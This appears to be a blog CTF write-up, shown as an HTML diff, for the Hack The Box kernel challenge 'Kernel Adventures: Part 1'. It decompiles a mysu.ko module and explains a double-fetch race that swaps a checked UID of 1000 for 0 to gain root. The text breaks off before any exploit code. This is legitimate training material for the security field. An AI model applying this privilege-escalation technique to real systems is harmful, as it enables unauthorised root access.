@@ -1,0 +1,459 @@
+<!doctype html><html lang="en"><head><title>Kernel Adventures: Part 1 | 7Rocky</title>
+<meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="author" content="7Rocky's Blog. Cybersecurity and Maths"><meta name="description" content="Kernel exploitation. Password hash cracking. Race condition. Double Fetch"><meta name="image" content="https://7rocky.github.io/images/pwn.png"><meta name="robots" content="index, follow"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta itemprop="description" content="Kernel exploitation. Password hash cracking. Race condition. Double Fetch"><meta itemprop="keywords" content><meta itemprop="name" content="Kernel Adventures: Part 1"><meta property="article:published_time" content><meta property="og:author" content="7Rocky's Blog. Cybersecurity and Maths"><meta property="og:description" content="Kernel exploitation. Password hash cracking. Race condition. Double Fetch"><meta property="og:image" content="https://7rocky.github.io/images/pwn.png"><meta property="og:locale" content="en_US"><meta property="og:site_name" content="7Rocky's Blog. Cybersecurity and Maths"><meta property="og:title" content="Kernel Adventures: Part 1"><meta property="og:type" content="website"><meta property="og:url" content="https://7rocky.github.io/en/ctf/htb-challenges/pwn/kernel-adventures-part-1/"><meta name="twitter:author" content="7Rocky's Blog. Cybersecurity and Maths"><meta name="twitter:card" content="Kernel exploitation. Password hash cracking. Race condition. Double Fetch"><meta name="twitter:description" content="Kernel exploitation. Password hash cracking. Race condition. Double Fetch"><meta name="twitter:image" content="https://7rocky.github.io/images/pwn.png"><meta name="twitter:title" content="Kernel Adventures: Part 1"><link href="/favicon.ico" rel="shortcut icon" type="image/x-icon"><link href="/css/style.css" rel="stylesheet"><link href="/css/main.css" rel="stylesheet"><link href="/css/code.css" rel="stylesheet"><link href="https://7rocky.github.io/en/ctf/htb-challenges/pwn/kernel-adventures-part-1/" rel="canonical"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script><script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script><script>MathJax={loader:{load:["[tex]/noerrors"]},options:{ignoreHtmlClass:"tex2jax_ignore",processHtmlClass:"tex2jax_process",skipHtmlTags:["noscript","pre","script","style","textarea"]},tex:{autoload:{color:[],colorv2:["color"]},displayMath:[["$$","$$"]],inlineMath:[["$","$"]],packages:{"[+]":["noerrors"]},processEnvironments:!0,processEscapes:!0}}</script><script type="text/javascript" src="//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-svg.js"></script><div id="math-consts" style="display:none">$
+\newcommand{\e}{e}
+\newcommand{\N}[1][]{\mathbb{N}^{#1}}
+\newcommand{\Q}[1][]{\mathbb{Q}^{#1}}
+\newcommand{\R}[1][]{\mathbb{R}^{#1}}
+\newcommand{\Z}[1][]{\mathbb{Z}^{#1}}
+\newcommand{\C}[1][]{\mathbb{C}^{#1}}
+\newcommand{\dx}{\,\mathrm{d}x}
+\newcommand{\dy}{\,\mathrm{d}y}
+\newcommand{\dz}{\,\mathrm{d}z}
+\newcommand{\dt}{\,\mathrm{d}t}
+\newcommand{\divides}{\, | \,}
+\newcommand{\st}{\; | \;}
+\renewcommand{\geq}{\geqslant}
+\renewcommand{\leq}{\leqslant}
+\renewcommand{\i}{\mathrm{i}}
+\newcommand{\rank}{\mathop{\mathrm{rank}}}
+\newcommand{\gcd}{\mathop{\mathrm{gcd}}}
+\newcommand{\tr}{\mathop{\mathrm{tr}}}
+\newcommand{\charField}{\mathop{\mathrm{char}}}
+\newcommand{\Image}{\mathop{\mathrm{Im}}}
+$</div><script src="/js/imc.js"></script><script>(async()=>await typeset(()=>[`#math-consts`]))()</script></head><body class="ma0 production"><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" id="navigation" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/en/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a href="/en/search" target class="link-transition link dib z-999 pt3 pt0-l mr1 search-link" title="Search" rel="noopener" aria-label="Search"><svg height="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 487.95 487.95" style="enable-background:new 0 0 487.95 487.95"><g><g><path d="M481.8 453l-140-140.1c27.6-33.1 44.2-75.4 44.2-121.6C386 85.9 299.5.2 193.1.2S0 86 0 191.4s86.5 191.1 192.9 191.1c45.2.0 86.8-15.5 119.8-41.4l140.5 140.5c8.2 8.2 20.4 8.2 28.6.0C490 473.4 490 461.2 481.8 453zM41 191.4c0-82.8 68.2-150.1 151.9-150.1s151.9 67.3 151.9 150.1-68.2 150.1-151.9 150.1S41 274.1 41 191.4z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#a9a9b3"/></g></g><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/></svg></a><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href="/ctf/htb-challenges/pwn/kernel-adventures-part-1/" title="es"><img alt="es" height="30px" src="/images/es.png" style="border:4px solid#000;border-radius:100%" width="30px">
+</a><a class="link-transition lang link dib z-999 pt3 pt0-l" href="#" title="en"><img alt="en" height="30px" src="/images/en.png" width="30px"></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb5" role="main" style="min-height:720px"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-80-l"><a aria-label="aside" class="instapaper_ignoref b tracked" href="../" style="font-size:1.2rem">&lt;- PWN</a><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/en/ctf/htb-challenges/pwn/kernel-adventures-part-1/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg></a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/en/ctf/htb-challenges/pwn/kernel-adventures-part-1/&amp;text=Kernel%20Adventures:%20Part%201" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://7rocky.github.io/en/ctf/htb-challenges/pwn/kernel-adventures-part-1/&amp;title=Kernel%20Adventures:%20Part%201" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">Kernel Adventures: Part 1</h1><p class="mb4 f6 dib tracked">12 minutes to read</p></header><aside aria-label="aside" class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contents</p><nav id="TableOfContents"><ul><li><a href="#setup-environment">Setup environment</a></li><li><a href="#reverse-engineering">Reverse engineering</a><ul><li><a href="#double-fetch">Double Fetch</a></li></ul></li><li><a href="#exploit-development">Exploit development</a><ul><li><a href="#password-hash-cracking">Password hash cracking</a></li><li><a href="#race-condition">Race condition</a></li></ul></li><li><a href="#flag">Flag</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><p>We are given a Linux file system and some other files common in kernel exploitation challenges:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">#</span> <span class="code-dark-green">ls</span> -lh
+total 12M
+-rw-r--r-- 1 root root 8,1M dic 11  2019 bzImage
+-rw-r--r-- 1 root root   84 dic 11  2019 notes.txt
+-rw-r--r-- 1 root root 3,2M dic 11  2019 <span class="code-red">rootfs.cpio.gz</span>
+-rwxr-xr-x 1 root root  262 dic 11  2019 <span class="code-green">run.sh</span>
+
+<span class="code-red">#</span> <span class="code-dark-green">cat</span> <span class="mtku">notes.txt</span>
+I removed the password hashes in the file I gave you. They're not supposed to be 0.  
+
+<span class="code-red">#</span> <span class="code-dark-green">cat</span> <span class="mtku">run.sh</span>
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">#!/bin/bash</span>
+
+<span class="mtk1">qemu-system-x86_64</span> <span class="mtk1">\</span>
+    <span class="mtk1">-m</span> <span class="mtk1">128M</span> <span class="mtk1">\</span>
+    <span class="mtk1">-nographic</span> <span class="mtk1">\</span>
+    <span class="mtk1">-kernel</span> <span class="mtk1">./bzImage</span> <span class="mtk1">\</span>
+    <span class="mtk1">-append</span> <span class="mtk4">'console=ttyS0</span> <span class="mtk4">loglevel=3</span> <span class="mtk4">oops=panic</span> <span class="mtk4">panic=1</span> <span class="mtk4">kaslr'</span> <span class="mtk1">\</span>  
+    <span class="mtk1">-monitor</span> <span class="mtk1">/dev/null</span> <span class="mtk1">\</span>
+    <span class="mtk1">-initrd</span> <span class="mtk1">./rootfs.cpio.gz</span>  <span class="mtk1">\</span>
+    <span class="mtk1">-no-kvm</span> <span class="mtk1">\</span>
+    <span class="mtk1">-cpu</span> <span class="mtk1">qemu64</span> <span class="mtk1">\</span>
+    <span class="mtk1">-smp</span> <span class="mtk1">cores=2</span>
+</code></pre></div><h2 id="setup-environment">Setup environment</h2><p>First of all, we must extract the Linux file system:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">#</span> <span class="code-dark-green">cp</span> <span class="mtku">rootfs.cpio.gz</span> rootfs.cpio.gz.bak  
+
+<span class="code-red">#</span> <span class="code-dark-green">gunzip</span> <span class="mtku">rootfs.cpio.gz</span>
+
+<span class="code-red">#</span> <span class="code-dark-green">cpio</span> -i < <span class="mtku">rootfs.cpio</span>
+13955 blocks
+
+<span class="code-red">#</span> <span class="code-dark-green">mv</span> <span class="mtku">rootfs.cpio.gz.bak</span> rootfs.cpio.gz
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">#</span> <span class="code-dark-green">ls</span> -lh --time-style=+
+total 19M
+drwxr-xr-x 2 root root 4,0K  <span class="code-blue">bin</span>
+-rw-r--r-- 1 root root 8,1M  bzImage
+drwxr-xr-x 4 root root 4,0K  <span class="code-blue">dev</span>
+drwxr-xr-x 5 root root 4,0K  <span class="code-blue">etc</span>
+-r-------- 1 root root   23  flag
+drwxr-xr-x 3 root root 4,0K  <span class="code-blue">home</span>
+-rwxr-xr-x 1 root root  443  <span class="code-green">init</span>
+drwxr-xr-x 3 root root 4,0K  <span class="code-blue">lib</span>
+lrwxrwxrwx 1 root root    3  <span class="code-cyan">lib64</span> -&gt; <span class="code-blue">lib</span>
+lrwxrwxrwx 1 root root   11  <span class="code-cyan">linuxrc</span> -&gt; <span class="code-green">bin/busybox</span>  
+drwxr-xr-x 2 root root 4,0K  <span class="code-blue">media</span>
+drwxr-xr-x 2 root root 4,0K  <span class="code-blue">mnt</span>
+-rw------- 1 root root 8,1K  mysu.ko
+-rw-r--r-- 1 root root   84  notes.txt
+drwxr-xr-x 2 root root 4,0K  <span class="code-blue">opt</span>
+drwxr-xr-x 2 root root 4,0K  <span class="code-blue">proc</span>
+drwx------ 2 root root 4,0K  <span class="code-blue">root</span>
+-rw-r--r-- 1 root root 6,9M  <span class="code-red">rootfs.cpio</span>
+-rw-r--r-- 1 root root 3,2M  <span class="code-red">rootfs.cpio.gz</span>
+drwxr-xr-x 2 root root 4,0K  <span class="code-blue">run</span>
+-rwxr-xr-x 1 root root  262  <span class="code-green">run.sh</span>
+drwxr-xr-x 2 root root 4,0K  <span class="code-blue">sbin</span>
+drwxr-xr-x 2 root root 4,0K  <span class="code-blue">sys</span>
+drwxr-xr-t 2 root root 4,0K  <span class="code-bg-blue code-white">tmp</span>
+drwxr-xr-x 6 root root 4,0K  <span class="code-blue">usr</span>
+drwxr-xr-x 4 root root 4,0K  <span class="code-blue">var</span>
+
+<span class="code-red">#</span> <span class="code-dark-green">cat</span> <span clas="mtku">flag</span>
+HTB{flag_will_be_here}
+</code></pre></div><p>Now we have identified where the flag will be in the remote instance.</p><h2 id="reverse-engineering">Reverse engineering</h2><p>We also have a kernel module called <code>mysu.ko</code>. We can analyze it in Ghidra. We see three functions to interact with the module:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">undefined8</span> <span class="mtk8">dev_open</span><span class="mtk1">()</span> <span class="mtk1">{</span>
+  <span class="mtk8">printk</span><span class="mtk1">(</span><span class="mtk5">&amp;</span><span class="mtk1">DAT_00100390);</span>
+  <span class="mtk5">return</span> <span class="mtk6">0</span><span class="mtk1">;</span>
+<span class="mtk1">}</span>
+
+
+<span class="mtk7 mtki">size_t</span> <span class="mtk8">dev_read</span><span class="mtk1">(undefined8</span> <span class="mtk9 mtki">param_1</span><span class="mtk1">,</span> <span class="mtk7 mtki">void</span> <span class="mtk5">*</span><span class="mtk9 mtki">param_2</span><span class="mtk1">,</span> <span class="mtk1">ulong</span> <span class="mtk9 mtki">param_3</span><span class="mtk1">)</span> <span class="mtk1">{</span>  
+  <span class="mtk1">ulong</span> <span class="mtk1">local_18;</span>
+
+  <span class="mtk1">local_18</span> <span class="mtk5">=</span> <span class="mtk1">param_3;</span>
+
+  <span class="mtk5">if</span> <span class="mtk1">(</span><span class="mtk5">0x</span><span class="mtk6">20</span> <span class="mtk5">&lt;</span> <span class="mtk1">param_3)</span> <span class="mtk1">{</span>
+    <span class="mtk1">local_18</span> <span class="mtk5">=</span> <span class="mtk5">0x</span><span class="mtk6">20</span><span class="mtk1">;</span>
+  <span class="mtk1">}</span>
+
+  <span class="mtk8">memcpy</span><span class="mtk1">(param_2,</span> <span class="mtk1">users,</span> <span class="mtk1">local_18);</span>
+
+  <span class="mtk5">return</span> <span class="mtk1">local_18;</span>
+<span class="mtk1">}</span>
+
+
+<span class="mtk1">ulong</span> <span class="mtk8">dev_write</span><span class="mtk1">(undefined8</span> <span class="mtk9 mtki">param_1</span><span class="mtk1">,</span> <span class="mtk7 mtki">int</span> <span class="mtk5">*</span><span class="mtk9 mtki">param_2</span><span class="mtk1">,</span> <span class="mtk1">ulong</span> <span class="mtk9 mtki">param_3</span><span class="mtk1">)</span> <span class="mtk1">{</span>
+  <span class="mtk7 mtki">int</span> <span class="mtk1">iVar1;</span>
+  <span class="mtk7 mtki">long</span> <span class="mtk1">lVar2;</span>
+
+  <span class="mtk5">if</span> <span class="mtk1">(param_3</span> <span class="mtk5">&lt;</span> <span class="mtk6">8</span><span class="mtk1">)</span> <span class="mtk1">{</span>
+    <span class="mtk5">return</span> <span class="mtk6">0</span><span class="mtk1">;</span>
+  <span class="mtk1">}</span>
+
+  <span class="mtk5">if</span> <span class="mtk1">(</span><span class="mtk5">*</span><span class="mtk1">param_2</span> <span class="mtk5">==</span> <span class="mtk1">users._0_4_)</span> <span class="mtk1">{</span>
+    <span class="mtk1">iVar1</span> <span class="mtk5">=</span> <span class="mtk8">hash</span><span class="mtk1">(param_2</span> <span class="mtk5">+</span> <span class="mtk6">1</span><span class="mtk1">);</span>
+
+    <span class="mtk5">if</span> <span class="mtk1">(iVar1</span> <span class="mtk5">==</span> <span class="mtk1">users._4_4_)</span> <span class="mtk5">goto</span> <span class="mtk1">LAB_0010017e;</span>
+
+    <span class="mtk5">if</span> <span class="mtk1">(users._8_4_</span> <span class="mtk5">!=</span> <span class="mtk5">*</span><span class="mtk1">param_2)</span> <span class="mtk1">{</span>
+      <span class="mtk5">return</span> <span class="mtk6">0</span><span class="mtk1">;</span>
+    <span class="mtk1">}</span>
+  <span class="mtk1">}</span> <span class="mtk5">else</span> <span class="mtk5">if</span> <span class="mtk1">(users._8_4_</span> <span class="mtk5">!=</span> <span class="mtk5">*</span><span class="mtk1">param_2)</span> <span class="mtk1">{</span>
+    <span class="mtk5">return</span> <span class="mtk6">0</span><span class="mtk1">;</span>
+  <span class="mtk1">}</span>
+
+  <span class="mtk1">iVar1</span> <span class="mtk5">=</span> <span class="mtk8">hash</span><span class="mtk1">(param_2</span> <span class="mtk5">+</span> <span class="mtk6">1</span><span class="mtk1">);</span>
+
+  <span class="mtk5">if</span> <span class="mtk1">(iVar1</span> <span class="mtk5">!=</span> <span class="mtk1">users._12_4_)</span> <span class="mtk1">{</span>
+    <span class="mtk5">return</span> <span class="mtk6">0</span><span class="mtk1">;</span>
+  <span class="mtk1">}</span>
+
+<span class="mtk1">LAB_0010017e:</span>
+  <span class="mtk1">iVar1</span> <span class="mtk5">=</span> <span class="mtk5">*</span><span class="mtk1">param_2;</span>
+  <span class="mtk1">lVar2</span> <span class="mtk5">=</span> <span class="mtk8">prepare_creds</span><span class="mtk1">();</span>
+
+  <span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">int</span> <span class="mtk5">*</span><span class="mtk1">) (lVar2</span> <span class="mtk5">+</span> <span class="mtk6">4</span><span class="mtk1">)</span> <span class="mtk5">=</span> <span class="mtk1">iVar1;</span>
+  <span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">int</span> <span class="mtk5">*</span><span class="mtk1">) (lVar2</span> <span class="mtk5">+</span> <span class="mtk6">8</span><span class="mtk1">)</span> <span class="mtk5">=</span> <span class="mtk1">iVar1;</span>
+  <span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">int</span> <span class="mtk5">*</span><span class="mtk1">) (lVar2</span> <span class="mtk5">+</span> <span class="mtk5">0x</span><span class="mtk6">c</span><span class="mtk1">)</span> <span class="mtk5">=</span> <span class="mtk1">iVar1;</span>
+  <span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">int</span> <span class="mtk5">*</span><span class="mtk1">) (lVar2</span> <span class="mtk5">+</span> <span class="mtk5">0x</span><span class="mtk6">10</span><span class="mtk1">)</span> <span class="mtk5">=</span> <span class="mtk1">iVar1;</span>
+  <span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">int</span> <span class="mtk5">*</span><span class="mtk1">) (lVar2</span> <span class="mtk5">+</span> <span class="mtk5">0x</span><span class="mtk6">14</span><span class="mtk1">)</span> <span class="mtk5">=</span> <span class="mtk1">iVar1;</span>
+  <span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">int</span> <span class="mtk5">*</span><span class="mtk1">) (lVar2</span> <span class="mtk5">+</span> <span class="mtk5">0x</span><span class="mtk6">18</span><span class="mtk1">)</span> <span class="mtk5">=</span> <span class="mtk1">iVar1;</span>
+  <span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">int</span> <span class="mtk5">*</span><span class="mtk1">) (lVar2</span> <span class="mtk5">+</span> <span class="mtk5">0x</span><span class="mtk6">1c</span><span class="mtk1">)</span> <span class="mtk5">=</span> <span class="mtk1">iVar1;</span>
+  <span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">int</span> <span class="mtk5">*</span><span class="mtk1">) (lVar2</span> <span class="mtk5">+</span> <span class="mtk5">0x</span><span class="mtk6">20</span><span class="mtk1">)</span> <span class="mtk5">=</span> <span class="mtk1">iVar1;</span>
+
+  <span class="mtk8">commit_creds</span><span class="mtk1">(lVar2);</span>
+
+  <span class="mtk5">return</span> <span class="mtk1">param_3;</span>
+<span class="mtk1">}</span>
+</code></pre></div><p>The one that is more interesting is <code>dev_write</code>. The arguments of the function are the same as in a <code>write</code> function in C. <code>param_3</code> corresponds to the size of data written, and if it is less than <code>8</code>, the function exits.</p><p>Then, it checks that the contents of <code>param_2</code> (which is our data) are equal to a global variable called <code>users</code>. We can see it in Ghidra or dumping the <code>.data</code> section with <code>readelf</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">#</span> <span class="code-dark-green">readelf</span> -x .data <span class="mtku">mysu.ko</span>
+
+Hex dump of section '.data':
+ NOTE: This section has relocations against it, but these have NOT been applied to this dump.  
+  0x00000000 e8030000 00000000 e9030000 00000000 ................
+  0x00000010 00000000 00000000 00000000 00000000 ................
+  0x00000020 00000000 00000000 00000000 00000000 ................
+  0x00000030 00000000 00000000 00000000 00000000 ................
+  0x00000040 00000000 00000000 00000000 00000000 ................
+  0x00000050 00000000 00000000 00000000 00000000 ................
+  0x00000060 00000000 00000000 00000000 00000000 ................
+  0x00000070 00000000 00000000 00000000 00000000 ................
+  0x00000080 00000000 00000000 00000000 00000000 ................
+  0x00000090 00000000 00000000 00000000 00000000 ................
+  0x000000a0 00000000 00000000 00000000 00000000 ................
+  0x000000b0 00000000 00000000 00000000 00000000 ................
+  0x000000c0 00000000 00000000 00000000 00000000 ................
+  0x000000d0 00000000 00000000 00000000 00000000 ................
+  0x000000e0 00000000 00000000 00000000 00000000 ................
+  0x000000f0 00000000 00000000 00000000 00000000 ................
+  0x00000100 00000000 00000000 00000000 00000000 ................
+  0x00000110 00000000 00000000 00000000 00000000 ................
+</code></pre></div><p>Here we see that <code>"\xe8\x03\x00\x00"</code> is <code>0x03e8</code> in hexadecimal, which is 1000 in decimal (likely to be a UID). Hence, <code>users._0_4_</code> refers to having UID 1000.</p><p>Then, the module takes the next bytes of our input data and calculates a hash. If that hash matches <code>users._4_4_</code> (which is <code>"\x00\x00\x00\x00"</code>), then we go to label <code>LAB_0010017e</code>, which uses functions <code>prepare_creds</code> and <code>commit_creds</code> to switch user.</p><h3 id="double-fetch">Double Fetch</h3><p>And the vulnerability is right there, because it is taking again our input data from <code>param_2</code>. There is a race condition where we can have UID 1000 and when the check is passed and we jump to <code>LAB_0010017e</code>, change our UID to 0, so that we become <code>root</code>. This is commonly known as Double Fetch.</p><p>Moreover, we are able to win the race because there is no <code>mutex</code> inside <code>init_module</code> (which would prevent us from changing our data):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">int</span> <span class="mtk8">init_module</span><span class="mtk1">()</span> <span class="mtk1">{</span>
+  <span class="mtk8">printk</span><span class="mtk1">(</span><span class="mtk5">&amp;</span><span class="mtk1">DAT_001003a0);</span>
